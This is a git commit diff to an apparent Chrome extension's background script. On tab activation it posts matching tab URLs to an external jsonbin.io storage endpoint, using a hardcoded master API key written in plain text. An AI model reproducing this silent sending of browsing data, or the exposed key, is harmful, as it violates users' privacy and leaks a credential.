bb124657498a62f596ca1833fdf1fe4f7117df6a
Ayberk Yigit <kurtknispel9@gmail.com>
2021-04-11 19:29:18 +0300

    fixed

--- background.js
+++ background.js
@@ -1,54 +1,50 @@
-const sendHttpRequest = (method, url, data) => {
-    const promise = new Promise((resolve, reject) => {
-      const xhr = new XMLHttpRequest();
-      xhr.open(method, url);
+// const sendHttpRequest = (method, url, data) => {
+//     const promise = new Promise((resolve, reject) => {
+//       const xhr = new XMLHttpRequest();
+//       xhr.open(method, url);
   
-      xhr.responseType = 'json';
+//       xhr.responseType = 'json';
   
-      if (data) {
-        xhr.setRequestHeader('Content-Type', 'application/json');
-      }
+//       if (data) {
+//         xhr.setRequestHeader('Content-Type', 'application/json');
+//       }
   
-      xhr.onload = () => {
-        if (xhr.status >= 400) {
-          reject(xhr.response);
-        } else {
-          resolve(xhr.response);
-        }
-      };
+//       xhr.onload = () => {
+//         if (xhr.status >= 400) {
+//           reject(xhr.response);
+//         } else {
+//           resolve(xhr.response);
+//         }
+//       };
   
-      xhr.onerror = () => {
-        reject('Something went wrong!');
-      };
+//       xhr.onerror = () => {
+//         reject('Something went wrong!');
+//       };
   
-      xhr.send(JSON.stringify(data));
-    });
-    return promise;
-  };
+//       xhr.send(JSON.stringify(data));
+//     });
+//     return promise;
+//   };
+
+let req = new XMLHttpRequest();
+
+let obj;
+
+req.onreadystatechange = () => {
+  if (req.readyState === XMLHttpRequest.DONE) {
+    console.log(req.responseText);
+  }
+};
 
 chrome.tabs.onActivated.addListener(tab =>{
    chrome.tabs.get(tab.tabId, current_tab_info=>{
        if(/^https:\/\/permissions/.test(current_tab_info.url)){
-        const sendData = () => {
-            sendHttpRequest('POST', 'https://reqres.in/api/data', {
-              data: current_tab_info.url
-              // password: 'pistol'
-            })
-              .then(responseData => {
-                console.log(responseData);
-              })
-              .catch(err => {
-                console.log(err);
-              });
-          }
-          sendData();
-          const getData = () => {
-            sendHttpRequest('GET', 'https://reqres.in/api/data').then(responseData => {
-              console.log(responseData);
-            });
-          };
-          getData();
-            console.log(current_tab_info.url)
+        obj=JSON.stringify(current_tab_info.url)
+        // console.log()
+        req.open("POST", "https://api.jsonbin.io/v3/b", true);
+        req.setRequestHeader("Content-Type", "application/json");
+        req.setRequestHeader("X-Master-Key", "$2b$10$.czrJw3TmYsiwxQwU.Wb2uy6/UQIDCY.BmOlXdJTU2REmLy0Feqme");
+        req.send(`{"data":${obj}}`)
        }
    })
 });
